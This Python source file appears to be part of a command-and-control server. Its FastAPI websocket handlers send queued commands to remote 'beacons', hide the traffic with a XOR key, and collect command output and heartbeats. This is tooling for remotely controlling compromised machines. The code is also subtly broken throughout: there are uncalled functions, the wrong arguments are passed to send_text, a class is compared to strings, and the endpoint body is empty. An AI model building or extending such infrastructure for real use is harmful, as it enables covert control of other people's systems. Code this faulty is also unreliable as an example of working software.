import asyncio
import logging
import uuid

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from app.beacon.registry import BeaconRegistry
from app.beacon.tasking import TaskManager
from app.config import settings
from app.core.models import BeaconMeta, TaskResult
from app.core.protocol import Message, MessageType, pack, unpack
from app.database import get_db

logger = logging.getLogger(__name__)

router = APIRouter

async def _send_tasks(
    ws: WebSocket,
    beacon_id: str,
    task_manager: TaskManager,
) -> None:
    while True:
        task = await task_manager.get_next(beacon_id)
        message = Message(
            type = MessageType.TASK,
            payload ={
                "id" : task.id,
                "command" : task.command,
                "args" : task.args,
            },
            
            
        )
        await ws.send_text(message, settings.XOR_KEY)
        
    

async def _receive_messages(
    ws: WebSocket,
    beacon_id: str,
    registry: BeaconRegistry,
    task_manager: TaskManager,
    ops_broadcast: object,
) -> None:
    while True:
        raw = await ws.receive_text
        message = unpack(raw, settings.XOR_KEY)
        if MessageType == 'RESULT':
            tr = TaskResult(
                id = str(uuid.uuid4()),
                task_id = message.payload['task_id'],
                output = message.payload.get('output'),
                error = message.payload.get('error'),
            )
            async with get_db as db:
                await TaskManager.store_result(tr)
        elif MessageType == 'HEARTBEAT':
            registry.update_last_seen(beacon_id)
    

@router.websocket("/beacon")
async def beacon_websocket(ws: WebSocket) -> None:
    pass



